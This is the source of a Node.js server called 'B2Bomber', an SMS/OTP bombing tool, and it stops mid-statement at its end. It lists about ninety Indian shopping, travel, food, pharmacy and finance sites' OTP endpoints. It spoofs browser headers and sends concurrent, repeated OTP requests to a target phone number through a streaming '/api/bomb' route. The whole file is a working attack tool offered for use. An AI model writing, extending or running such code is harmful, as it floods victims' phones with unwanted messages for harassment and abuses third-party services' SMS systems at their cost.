
/* ============================================================
 * B2Bomber — OTP Sender  ·  server.js
 * Backend for public/index.html
 *
 * Endpoints:
 *   GET  /api/health          -> { services, live, benched, solved }
 *   GET  /api/diag            -> full diagnostic dump
 *   GET  /api/selftest?number -> probe every service once, bench dead ones
 *   POST /api/bomb            -> NDJSON stream (start / result / done)
 *   POST /api/stats/reset     -> clear bench + counters
 *
 * Only dependency: express. Uses Node 18+ global fetch.
 * ============================================================ */

import express from 'express';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));

/* ---------------- config ---------------- */
const PORT             = Number(process.env.PORT || 3000);
const CONCURRENCY      = Number(process.env.CONCURRENCY || 14);
const TIMEOUT_MS       = Number(process.env.TIMEOUT_MS || 8000);
const SELFTEST_TIMEOUT = Number(process.env.SELFTEST_TIMEOUT || 7000);
const SELFTEST_CONC    = Number(process.env.SELFTEST_CONC || 14);
const BENCH_AFTER      = Number(process.env.BENCH_AFTER || 2);
const AUTO_SELFTEST    = process.env.AUTO_SELFTEST !== '0';
const TEST_NUMBER      = process.env.TEST_NUMBER || '9999999999';
const MAX_SNIPPET      = 120;

/* ---------------- small helpers ---------------- */
const UAS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15',
  'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0'
];
const UA = () => UAS[(Math.random() * UAS.length) | 0];

const nf = (digits) => {
  const all = String(digits).replace(/\D/g, '');
  const d10 = all.slice(-10);
  const cc  = all.slice(0, -10) || '91';
  return { all, d10, cc, e164: '+' + all, p: cc + d10 };
};

const TOKENS = (n) => ({
  d10: n.d10,
  e164: n.e164,
  ed10: encodeURIComponent(n.d10),
  ee164: encodeURIComponent(n.e164),
  all: n.all,
  cc: n.cc,
  p: n.p
});

const fill = (s, n) => String(s).replace(/\{(\w+)\}/g, (m, k) => (k in TOKENS(n) ? TOKENS(n)[k] : m));

const fillDeep = (v, n) =>
  typeof v === 'string' ? fill(v, n)
  : Array.isArray(v) ? v.map((x) => fillDeep(x, n))
  : v && typeof v === 'object' ? Object.fromEntries(Object.entries(v).map(([k, x]) => [k, fillDeep(x, n)]))
  : v;

const clean = (t) => String(t || '').replace(/<[^>]*>/g, ' ').replace(/&nbsp;/g, ' ').replace(/\s+/g, ' ').trim();
const snippetOf = (t) => clean(t).slice(0, MAX_SNIPPET);

/* bodies that look like success (HTTP 200) but are actually rejections */
const GLOBAL_REJECT = /(invalid\s+(mobile|phone|number|msisdn)|not\s+a\s+valid\s+(mobile|phone|number)|too\s+many\s+requests|rate\s*limit|please\s+enter\s+a\s+valid|bad\s+request|unprocessable|number\s+is\s+invalid)/i;

/* ---------------- service catalogue ----------------
 * fields:
 *   id, name            -> identity
 *   u: [ ...urls ]      -> candidates, tried in order until one answers
 *   method              -> default: POST if a body exists else GET
 *   form                -> urlencoded body template
 *   json                -> JSON body template (object)
 *   raw                 -> raw string body template
 *   headers             -> extra headers
 *   expect              -> regex that MUST match body for success
 *   reject              -> regex that MUST NOT match body
 *   loose               -> disable the global rejection heuristic
 * tokens: {d10} {e164} {ed10} {ee164} {all} {cc} {p}
 * ---------------------------------------------------- */
const SERVICES = [
  /* ---------- shopping / retail ---------- */
  { id: 'flipkart', name: 'Flipkart', method: 'POST',
    u: ['https://www.flipkart.com/api/5/user/otp/generate', 'https://www.flipkart.com/api/6/user/otp/generate'],
    form: 'loginId=%2B91{d10}',
    headers: { 'x-user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0 FKUA/website/42/website/Desktop',
               origin: 'https://www.flipkart.com', referer: 'https://www.flipkart.com/' } },

  { id: 'snapdeal', name: 'Snapdeal', method: 'POST',
    u: ['https://www.snapdeal.com/sendOTP'],
    form: 'emailId=&mobileNumber={d10}&purpose=LOGIN_WITH_MOBILE_OTP',
    headers: { 'x-requested-with': 'XMLHttpRequest', referer: 'https://www.snapdeal.com/iframeLogin' } },

  { id: 'myntra', name: 'Myntra', method: 'POST', loose: true,
    u: ['https://www.myntra.com/gateway/v2/user/otp/generate'],
    json: { mobile: '{d10}', is_mobile: true },
    headers: { referer: 'https://www.myntra.com/', origin: 'https://www.myntra.com' } },

  { id: 'ajio', name: 'AJIO', method: 'POST', loose: true,
    u: ['https://www.ajio.com/api/auth/otp/generate', 'https://www.ajio.com/api/auth/sendOtp'],
    json: { mobileNumber: '{d10}' } },

  { id: 'nykaa', name: 'Nykaa', method: 'POST', loose: true,
    u: ['https://www.nykaa.com/app-api/index.php?route=api/user/sendOtp', 'https://www.nykaa.com/app-api/index.php?route=api/user/otp'],
    json: { mobile: '{d10}', country_code: '91' } },

  { id: 'bewakoof', name: 'Bewakoof', method: 'POST', loose: true,
    u: ['https://www.bewakoof.com/api/v1.0/auth/otp-login'],
    json: { mobile: '{d10}' } },

  { id: 'voonik', name: 'Voonik', method: 'POST', loose: true,
    u: ['https://www.voonik.com/mobile/send_otp'],
    form: 'mobile={d10}' },

  { id: 'limeroad', name: 'Limeroad', method: 'POST', loose: true,
    u: ['https://www.limeroad.com/otp/generate'],
    form: 'mobile={d10}' },

  { id: 'zivame', name: 'Zivame', method: 'POST', loose: true,
    u: ['https://www.zivame.com/api/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'pepperfry', name: 'Pepperfry', method: 'POST', loose: true,
    u: ['https://www.pepperfry.com/rest/api/v1/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'meesho', name: 'Meesho', method: 'POST', loose: true,
    u: ['https://www.meesho.com/api/v1/otp/send'],
    json: { phone: '{d10}' } },

  { id: 'firstcry', name: 'FirstCry', method: 'POST', loose: true,
    u: ['https://www.firstcry.com/otp/sendotp'],
    form: 'mobileno={d10}' },

  { id: 'hopscotch', name: 'Hopscotch', method: 'POST', loose: true,
    u: ['https://www.hopscotch.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'lenskart', name: 'Lenskart', method: 'POST', loose: true,
    u: ['https://api.lenskart.com/v2/customers/otp'],
    json: { phoneNumber: '{d10}' } },

  { id: 'boat', name: 'boAt', method: 'POST', loose: true,
    u: ['https://www.boat-lifestyle.com/apps/otp/send'],
    form: 'phone={d10}' },

  { id: 'mamaearth', name: 'Mamaearth', method: 'POST', loose: true,
    u: ['https://www.mamaearth.in/apps/otp/send'],
    form: 'phone={d10}' },

  { id: 'plum', name: 'Plum', method: 'POST', loose: true,
    u: ['https://www.plumgoodness.com/apps/otp'],
    form: 'phone={d10}' },

  { id: 'purplle', name: 'Purplle', method: 'POST', loose: true,
    u: ['https://www.purplle.com/api/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'beardo', name: 'Beardo', method: 'POST', loose: true,
    u: ['https://www.beardo.in/apps/otp/send'],
    form: 'phone={d10}' },

  { id: 'mancompany', name: 'The Man Company', method: 'POST', loose: true,
    u: ['https://www.themancompany.com/apps/otp'],
    form: 'phone={d10}' },

  { id: 'bombayshaving', name: 'Bombay Shaving Co', method: 'POST', loose: true,
    u: ['https://www.bombayshavingcompany.com/apps/otp'],
    form: 'phone={d10}' },

  { id: 'sugar', name: 'SUGAR Cosmetics', method: 'POST', loose: true,
    u: ['https://www.sugarcosmetics.com/apps/otp'],
    form: 'phone={d10}' },

  { id: 'wow', name: 'WOW Skin Science', method: 'POST', loose: true,
    u: ['https://www.wowskinscience.com/apps/otp'],
    form: 'phone={d10}' },

  { id: 'sleepycat', name: 'The Sleepy Cat', method: 'POST', loose: true,
    u: ['https://www.thesleepycat.com/apps/otp'],
    form: 'phone={d10}' },

  { id: 'wakefit', name: 'Wakefit', method: 'POST', loose: true,
    u: ['https://www.wakefit.co/apps/otp'],
    form: 'phone={d10}' },

  { id: 'shopclues', name: 'ShopClues', method: 'POST', loose: true,
    u: ['https://www.shopclues.com/index.php?route=account/otp/send'],
    form: 'telephone={d10}' },

  { id: 'tatacliq', name: 'Tata CLiQ', method: 'POST', loose: true,
    u: ['https://www.tatacliq.com/moengage/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'bluestone', name: 'BlueStone', method: 'POST', loose: true,
    u: ['https://www.bluestone.com/apps/otp'],
    form: 'phone={d10}' },

  { id: 'caratlane', name: 'CaratLane', method: 'POST', loose: true,
    u: ['https://www.caratlane.com/apps/otp'],
    form: 'phone={d10}' },

  { id: 'giva', name: 'GIVA', method: 'POST', loose: true,
    u: ['https://www.giva.co/apps/otp'],
    form: 'phone={d10}' },

  /* ---------- travel ---------- */
  { id: 'goibibo', name: 'Goibibo', method: 'POST',
    u: ['https://www.goibibo.com/common/downloadsms/'],
    form: 'mbl={d10}',
    headers: { referer: 'https://www.goibibo.com/mobile/?sms=success' } },

  { id: 'treebo', name: 'Treebo', method: 'POST',
    u: ['https://www.treebo.com/api/v2/auth/login/otp/'],
    json: { phone_number: '{d10}' },
    headers: { referer: 'https://www.treebo.com/login/', origin: 'https://www.treebo.com', authorization: 'Bearer null' } },

  { id: 'redbus', name: 'redBus', method: 'POST', loose: true,
    u: ['https://www.redbus.in/api/getOTP'],
    json: { number: '{d10}' } },

  { id: 'makemytrip', name: 'MakeMyTrip', method: 'POST', loose: true,
    u: ['https://www.makemytrip.com/api/otp/send'],
    json: { phone: '{d10}' } },

  { id: 'easemytrip', name: 'EaseMyTrip', method: 'POST', loose: true,
    u: ['https://www.easemytrip.com/api/sendotp'],
    json: { mobile: '{d10}' } },

  { id: 'yatra', name: 'Yatra', method: 'POST', loose: true,
    u: ['https://www.yatra.com/api/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'oyo', name: 'OYO', method: 'POST', loose: true,
    u: ['https://www.oyorooms.com/api/v2/auth/otp'],
    json: { phone: '{d10}' } },

  { id: 'fabhotels', name: 'FabHotels', method: 'POST', loose: true,
    u: ['https://www.fabhotels.com/api/v2/otp'],
    json: { mobile: '{d10}' } },

  { id: 'cleartrip', name: 'Cleartrip', method: 'POST', loose: true,
    u: ['https://www.cleartrip.com/api/otp/send'],
    json: { mobile: '{d10}' } },

  { id: 'ixigo', name: 'ixigo', method: 'POST', loose: true,
    u: ['https://www.ixigo.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'abhibus', name: 'AbhiBus', method: 'POST', loose: true,
    u: ['https://www.abhibus.com/api/otp'],
    json: { mobile: '{d10}' } },

  /* ---------- food / delivery / quick-commerce ---------- */
  { id: 'swiggy', name: 'Swiggy', method: 'POST',
    u: ['https://www.swiggy.com/dapi/auth/sms-otp'],
    json: { mobile: '{d10}', _csrf: '' },
    headers: { referer: 'https://www.swiggy.com/', origin: 'https://www.swiggy.com' } },

  { id: 'zomato', name: 'Zomato', method: 'POST', loose: true,
    u: ['https://www.zomato.com/webroutes/auth/loginWithPhone', 'https://www.zomato.com/webroutes/auth/mobileNumber/sendOtp'],
    form: 'phoneNumber={d10}',
    headers: { referer: 'https://www.zomato.com/', 'x-requested-with': 'XMLHttpRequest' } },

  { id: 'faasos', name: 'Faasos', method: 'POST', loose: true,
    u: ['https://www.faasos.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'box8', name: 'Box8', method: 'POST', loose: true,
    u: ['https://www.box8.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'freshmenu', name: 'FreshMenu', method: 'POST', loose: true,
    u: ['https://www.freshmenu.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'licious', name: 'Licious', method: 'POST', loose: true,
    u: ['https://www.licious.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'countrydelight', name: 'Country Delight', method: 'POST', loose: true,
    u: ['https://www.countrydelight.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'bigbasket', name: 'BigBasket', method: 'POST', loose: true,
    u: ['https://www.bigbasket.com/auth/otp/generate/', 'https://www.bigbasket.com/auth/generate-otp/'],
    json: { mobile: '{d10}' } },

  { id: 'jiomart', name: 'JioMart', method: 'POST', loose: true,
    u: ['https://www.jiomart.com/api/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'blinkit', name: 'Blinkit', method: 'POST', loose: true,
    u: ['https://api.grofers.com/v2/auth/otp', 'https://api.blinkit.com/v2/auth/otp'],
    json: { phone: '{d10}' } },

  { id: 'zepto', name: 'Zepto', method: 'POST', loose: true,
    u: ['https://api.zeptonow.com/api/v1/auth/otp/generate'],
    json: { phone: '{d10}' } },

  { id: 'dunzo', name: 'Dunzo', method: 'POST', loose: true,
    u: ['https://www.dunzo.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'dominos', name: "Domino's", method: 'POST', loose: true,
    u: ['https://www.dominos.co.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'pizzahut', name: 'Pizza Hut', method: 'POST', loose: true,
    u: ['https://www.pizzahut.co.in/api/otp'],
    json: { mobile: '{d10}' } },

  /* ---------- health / pharmacy / fitness ---------- */
  { id: 'netmeds', name: 'Netmeds', method: 'POST',
    u: ['https://www.netmeds.com/sociallogin/popup/checkmobileno/'],
    form: 'register_mobileno={d10}',
    headers: { 'x-requested-with': 'XMLHttpRequest', referer: 'https://www.netmeds.com/customer/account/create/' } },

  { id: 'healthkart', name: 'HealthKart',
    u: ['https://www.healthkart.com/api/user/validate/{d10}/signup?trackingSource=HM-LPOPUP',
        'https://www.healthkart.com/api/user/login/send/otp/{d10}?trackingSource=HM-LPOPUP'] },

  { id: 'onemg', name: 'Tata 1mg', method: 'POST', loose: true,
    u: ['https://www.1mg.com/api/v1/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'pharmeasy', name: 'PharmEasy', method: 'POST', loose: true,
    u: ['https://pharmeasy.in/api/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'apollopharmacy', name: 'Apollo Pharmacy', method: 'POST', loose: true,
    u: ['https://www.apollopharmacy.in/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'medplus', name: 'MedPlus', method: 'POST', loose: true,
    u: ['https://www.medplusmart.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'truemeds', name: 'Truemeds', method: 'POST', loose: true,
    u: ['https://www.truemeds.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'practo', name: 'Practo', method: 'POST', loose: true,
    u: ['https://www.practo.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'cultfit', name: 'cult.fit', method: 'POST', loose: true,
    u: ['https://www.cult.fit/api/otp'],
    json: { mobile: '{d10}' } },

  /* ---------- fintech / finance ---------- */
  { id: 'mobikwik', name: 'MobiKwik', method: 'POST',
    u: ['https://appapi.mobikwik.com/p/account/otp/cell'],
    json: { cell: '{d10}' },
    headers: { 'x-app-ver': '1', 'x-mclient': '1' } },

  { id: 'freecharge', name: 'Freecharge', method: 'POST', loose: true,
    u: ['https://www.freecharge.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'paisabazaar', name: 'Paisabazaar', method: 'POST',
    u: ['https://myaccount.paisabazaar.com/my-account/'],
    form: 'mobile_number={d10}&step=send_password&request_page=landing',
    headers: { 'x-requested-with': 'XMLHttpRequest', referer: 'https://myaccount.paisabazaar.com/my-account/' } },

  { id: 'bankbazaar', name: 'BankBazaar', method: 'POST', loose: true,
    u: ['https://www.bankbazaar.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'policybazaar', name: 'Policybazaar', method: 'POST', loose: true,
    u: ['https://www.policybazaar.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'groww', name: 'Groww', method: 'POST', loose: true,
    u: ['https://groww.in/v1/api/otp/generate'],
    json: { mobile: '{d10}' } },

  { id: 'upstox', name: 'Upstox', method: 'POST', loose: true,
    u: ['https://api.upstox.com/v2/login/otp'],
    json: { mobile: '{d10}' } },

  { id: 'zerodha', name: 'Zerodha', method: 'POST', loose: true,
    u: ['https://kite.zerodha.com/api/login/otp'],
    json: { mobile: '{d10}' } },

  { id: 'angelone', name: 'Angel One', method: 'POST', loose: true,
    u: ['https://www.angelone.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'cred', name: 'CRED', method: 'POST', loose: true,
    u: ['https://api.cred.club/apiv1/otp/generate'],
    json: { phone: '{d10}' } },

  { id: 'jupiter', name: 'Jupiter', method: 'POST', loose: true,
    u: ['https://jupiter.money/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'khatabook', name: 'Khatabook', method: 'POST', loose: true,
    u: ['https://khatabook.com/api/otp'],
    json: { mobile: '{d10}' } },

  /* ---------- classifieds / auto ---------- */
  { id: 'quikr', name: 'Quikr', method: 'POST', loose: true,
    u: ['https://www.quikr.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'olx', name: 'OLX', method: 'POST', loose: true,
    u: ['https://www.olx.in/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'nobroker', name: 'NoBroker', method: 'POST', loose: true,
    u: ['https://www.nobroker.in/api/v3/otp'],
    json: { phone: '{d10}' } },

  { id: 'cars24', name: 'Cars24', method: 'POST', loose: true,
    u: ['https://www.cars24.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'cardekho', name: 'CarDekho', method: 'POST', loose: true,
    u: ['https://www.cardekho.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'spinny', name: 'Spinny', method: 'POST', loose: true,
    u: ['https://www.spinny.com/api/otp'],
    json: { mobile: '{d10}' } },

  /* ---------- mobility ---------- */
  { id: 'ola', name: 'Ola', method: 'POST', loose: true,
    u: ['https://api.olamaps.io/api/otp'],
    json: { phone: '{d10}' } },

  { id: 'rapido', name: 'Rapido', method: 'POST', loose: true,
    u: ['https://api.rapido.bike/api/otp'],
    json: { phone: '{d10}' } },

  { id: 'uber', name: 'Uber', method: 'POST', loose: true,
    u: ['https://www.uber.com/api/otp'],
    json: { phone: '{d10}' } },

  /* ---------- local / legacy / other ---------- */
  { id: 'sulekha', name: 'Sulekha',
    u: ['https://myaccount.sulekha.com/network/userauthv1.aspx?mode=sendvcode&mobilenumber={d10}&rnd=0'] },

  { id: 'justdial', name: 'JustDial',
    u: ['https://www.justdial.com/functions/ajxandroid.php?phn={d10}&em=e.g.+abc%40xyz.com&vcode=-&type=1&applink=aib&apppage=jdmpage&pageName=jd_on_mobile'] },

  { id: 'naaptol', name: 'Naaptol',
    u: ['https://m.naaptol.com/faces/jsp/ajax/ajax.jsp?actionname=checkMobileUserExists&mobile={d10}'] },

  { id: 'spencers', name: 'Spencers',
    u: ['http://www.spencers.in/genOtp/genOTP.php?action=genOTP&phone={d10}'] },

  { id: 'iffco', name: 'IFFCO Bazar', method: 'POST',
    u: ['https://www.iffcobazar.in/login_otp.html'],
    form: 'submitted=yes&phone_no={d10}',
    headers: { referer: 'https://www.iffcobazar.in/login_otp.html' } },

  { id: 'homeshop18', name: 'HomeShop18', method: 'POST',
    u: ['https://mbe.homeshop18.com/services/secure/user/generate/otp'],
    form: 'submit=submit&identity={d10}&otpType=SIGNUP_OTP',
    headers: { 'x-hs18-app-version': '3.1.0', 'x-hs18-app-id': '0', 'x-hs18-device-version': '25', 'x-hs18-app-platform': 'androidApp' } },

  { id: 'tatadocomo', name: 'Tata Docomo',
    u: ['https://www.tatadocomo.com/INonRender/Personal_MydocomoApp/GenerateOTP?mobile={d10}'] },

  { id: 'narendramodi', name: 'NarendraModi.in',
    u: ['http://www.narendramodi.in/site/senddnldlink?contact_no={d10}'] },

  { id: 'bookmyshow', name: 'BookMyShow', method: 'POST', loose: true,
    u: ['https://in.bookmyshow.com/api/otp'],
    json: { mobile: '{d10}' } },

  { id: 'paytm', name: 'Paytm', method: 'POST', loose: true,
    u: ['https://accounts.paytm.com/api/otp'],
    json: { mobile: '{d10}' } }
];

/* ---------------- runtime state ---------------- */
for (const s of SERVICES) {
  s.fails = 0;
  s.okCount = 0;
  s.failCount = 0;
  s.benched = false;
  s.solvedUrl = null;
  s.lastStatus = 0;
  s.lastMs = 0;
  s.lastError = '';
  s.lastAt = 0;
}

let pathSolved = 0;
const stats = { startedAt: Date.now(), runs: 0, lastRun: 0, lastSent: 0, lastFailed: 0, selftests: 0 };

const liveCount = () => SERVICES.filter((s) => !s.benched).length;

/* ---------------- http primitives ---------------- */
async function callOnce(svc, url, n, timeoutMs, outerSignal) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  const onOuter = () => ctrl.abort();
  if (outerSignal) outerSignal.addEventListener('abort', onOuter, { once: true });

  const t0 = Date.now();
  try {
    const headers = {
      'user-agent': UA(),
      accept: '*/*',
      'accept-language': 'en-IN,en;q=0.9',
      ...fillDeep(svc.headers || {}, n)
    };

    let body;
    if (svc.json) {
      headers['content-type'] = 'application/json';
      body = JSON.stringify(fillDeep(svc.json, n));
    } else if (svc.form) {
      headers['content-type'] = 'application/x-www-form-urlencoded';
      body = fill(svc.form, n);
    } else if (svc.raw) {
      if (!headers['content-type']) headers['content-type'] = 'application/json';
      body = fill(svc.raw, n);
    }

    const method = svc.method || (body ? 'POST' : 'GET');
    const res = await fetch(url, { method, headers, body, redirect: 'follow', signal: ctrl.signal });
    const text = (await res.text()).slice(0, 6000);
    const status = res.status;
    const ms = Date.now() - t0;

    let ok = status >= 200 && status < 300;
    let error = '';
    if (ok && svc.expect && !svc.expect.test(text)) { ok = false; error = 'no-otp-marker'; }
    if (ok && !svc.loose && GLOBAL_REJECT.test(text.slice(0, 1500))) { ok = false; error = 'rejected'; }
    if (ok && svc.reject && svc.reject.test(text)) { ok = false; error = 'rejected'; }
    if (!ok && !error) error = status >= 400 ? 'HTTP ' + status : 'fail';

    return { ok, status, ms, error, snippet: snippetOf(text), url };
  } catch (e) {
    const ms = Date.now() - t0;
    const timedOut = ctrl.signal.aborted && !(outerSignal && outerSignal.aborted);
    return { ok: false, status: 0, ms, error: timedOut ? 'timeout' : (e && e.name === 'AbortError' ? 'aborted' : (e?.message || 'network error')), snippet: '', url };
  } finally {
    clearTimeout(timer);
    if (outerSignal) outerSignal.removeEventListener('abort', onOuter);
  }
}

async function hit(svc, digits, outerSignal, timeoutMs = TIMEOUT_MS) {
  const n = nf(digits);
  const urls = svc.solvedUrl
    ? [svc.solvedUrl, ...svc.u.filter((u) => u !== svc.solvedUrl)]
    : svc.u.slice();

  let last = null;
  for (const raw of urls) {
    if (outerSignal && outerSignal.aborted) break;
    const url = fill(raw, n);
    const r = await callOnce(svc, url, n, timeoutMs, outerSignal);
    if (r.ok) {
      if (svc.solvedUrl !== url) { svc.solvedUrl = url; pathSolved++; }
      return r;
    }
    last = r;
  }
  return last || { ok: false, status: 0, ms: 0, error: 'no url', snippet: '', url: svc.u[0] };
}

async function runPool(items, limit, worker) {
  let idx = 0;
  const n = Math.max(1, Math.min(limit, items.length));
  const workers = Array.from({ length: n }, async () => {
    while (true) {
      const i = idx++;
      if (i >= items.length) return;
      try { await worker(items[i]); } catch { /* keep going */ }
    }
  });
  await Promise.all(workers);
}

/* ---------------- express app ---------------- */
const app = express();
app.disable('x-powered-by');
app.set('trust proxy', 1);
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Headers', 'content-type');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

app.use(express.static(path.join(__dirname, 'public'), { extensions: ['html'] }));

/* ---------------- routes ---------------- */
app.get('/api/health', (req, res) => {
  res.json({
    ok: true,
    services: SERVICES.length,
    live: liveCount(),
    benched: SERVICES.length - liveCount(),
    solved: pathSolved,
    uptime: Math.round((Date.now() - stats.startedAt) / 1000)
  });
});

app.get('/api/ping', (req, res) => res.send('ok'));

app.get('/api/diag', (req, res) => {
  res.json({
    ok: true,
    node: process.version,
    uptimeSec: Math.round((Date.now() - stats.startedAt) / 1000),
    config: { CONCURRENCY, TIMEOUT_MS, SELFTEST_TIMEOUT, BENCH_AFTER, AUTO_SELFTEST },
    stats,
    counts: { total: SERVICES.length, live: liveCount(), benched: SERVICES.length - liveCount(), solved: pathSolved },
    services: SERVICES.map((s) => ({
      id: s.id,
      name: s.name,
      method: s.method || (s.json || s.form || s.raw ? 'POST' : 'GET'),
      urls: s.u,
      activeUrl: s.solvedUrl,
      benched: s.benched,
      fails: s.fails,
      ok: s.okCount,
      fail: s.failCount,
      lastStatus: s.lastStatus,
      lastMs: s.lastMs,
      lastError: s.lastError,
      lastAt: s.lastAt ? new Date(s.lastAt).toISOString() : null
    }))
  });
});

app.get('/api/services', (req, res) => {
  res.json({ total: SERVICES.length, services: SERVICES.map((s) => ({ id: s.id, name: s.name, benched: s.benched, solved: !!s.solvedUrl })) });
});

app.post('/api/stats/reset', (req, res) => {
  for (const s of SERVICES) {
    s.fails = 0; s.okCount = 0; s.failCount = 0; s.benched = false;
    s.lastStatus = 0; s.lastMs = 0; s.lastError = ''; s.lastAt = 0;
  }
  stats.runs = 0; stats.lastSent = 0; stats.lastFailed = 0;
  res.json({ ok: true, services: SERVICES.length, live: liveCount() });
});

/* -------- self test: probe everything once, bench the dead -------- */
let selftestRunning = null;

async function doSelftest(number, benchDead = true) {
  const digits = nf(number).all || TEST_NUMBER;
  const results = [];
  await runPool(SERVICES.slice(), SELFTEST_CONC, async (svc) => {
    const r = await hit(svc, digits, null, SELFTEST_TIMEOUT);
    svc.lastStatus = r.status;
    svc.lastMs = r.ms;
    svc.lastError = r.ok ? '' : r.error;
    svc.lastAt = Date.now();
    if (r.ok) {
      svc.okCount++; svc.fails = 0; svc.benched = false;
    } else {
      svc.failCount++; svc.fails++;
      if (benchDead && svc.fails >= 1) svc.benched = true;
    }
    results.push({ id: svc.id, name: svc.name, status: r.status, ms: r.ms, ok: r.ok, error: r.ok ? '' : r.error, snippet: r.snippet, url: r.url });
  });
  results.sort((a, b) => (b.ok - a.ok) || a.name.localeCompare(b.name));
  stats.selftests++;
  return { ok: results.filter((r) => r.ok).length, total: results.length, number: digits, results };
}

app.get('/api/selftest', async (req, res) => {
  const number = String(req.query.number || TEST_NUMBER).replace(/\D/g, '') || TEST_NUMBER;
  try {
    if (selftestRunning) await selftestRunning.catch(() => {});
    selftestRunning = doSelftest(number, true);
    const out = await selftestRunning;
    selftestRunning = null;
    res.json(out);
  } catch (e) {
    selftestRunning = null;
    res.status(500).json({ error: e?.message || 'selftest failed' });
  }
});

/* -------- the main event: streaming bomb -------- */
app.post('/api/bomb', async (req, res) => {
  const digits = String(req.body?.number || '').replace(/\D/g, '');
  if (digits.length < 10 || digits.length > 15) return res.status(400).json({ error: 'invalid number' });

  const repeat = Math.min(10, Math.max(1, parseInt(req.body?.repeat, 10) || 1));
  const skipDead = !!req.body?.skipDead;

  res.status(200);
  res.setHeader('Content-Type', 'application/x-ndjson; charset=utf-8');
  res.setHeader('Cache-Control', 'no-cache, no-transform');
  res.setHeader('X-Accel-Buffering', 'no');
  if (res.flushHeaders) res.flushHeaders();

  const send = (o) => { try { res.write(JSON.stringify(o) + '\n'); } catch { /* ignore */ } };

  const pool = skipDead ? SERVICES.filter((s) => !s.benched) : SERVICES.slice();
  const skipped = SERVICES.length - pool.length;
  const total = pool.length * repeat;

  const t0 = Date.now();
  send({ type: 'start', total, services: pool.length, repeat, skipped });

  if (!pool.length) {
    send({ type: 'done', total: 0, sent: 0, failed: 0, done: 0, ms: 0 });
    return res.end();
  }

  const outer = new AbortController();
  let closed = false;
  req.on('close', () => { closed = true; outer.abort(); });

  const queue = [];
  for (const svc of pool) for (let i = 0; i < repeat; i++) queue.push(svc);

  let sent = 0, failed = 0, done = 0;

  await runPool(queue, CONCURRENCY, async (svc) => {
    if (closed) return;
    const r = await hit(svc, digits, outer.signal);

    svc.lastStatus = r.status;
    svc.lastMs = r.ms;
    svc.lastError = r.ok ? '' : r.error;
    svc.lastAt = Date.now();

    if (r.ok) {
      sent++; svc.okCount++; svc.fails = 0; svc.benched = false;
    } else {
      failed++; svc.failCount++; svc.fails++;
      if (svc.fails >= BENCH_AFTER) svc.benched = true;
    }
    done++;

    send({
      type: 'result',
      id: svc.id,
      name: svc.name,
      status: r.status,
      ms: r.ms,
      ok: r.ok,
      error: r.ok ? '' : r.error,
      snippet: r.snippet,
      url: r.url,
      done, sent, failed
    });
  });

  const ms = Date.now() - t0;
  stats.runs++; stats.lastRun = Date.now(); stats.lastSent = sent; stats.lastFailed = failed;
  send({ type: 'done', total, sent, failed, done, ms });
  res.end();
});

/* ---------------- static fallback ---------------- */
app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

app.use((req, res) => res.status(404).json({ error: 'not found' }));

app.use((err, req, res, next) => {
  console.error('[b2bomber]', err?.message || err);
  if (!res.headersSent) res.status(500).json({ error: 'internal error' });
});

/* ---------------- boot ---------------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[B2Bomber] listening on ${PORT} · ${SERVICES.length} services · concurrency ${CONCURRENCY}`);
  if (AUTO_SELFTEST) {
    setTimeout(() => {
      console.log('[B2Bomber] auto self-test starting…');
      doSelftest(TEST_NUMBER, true)
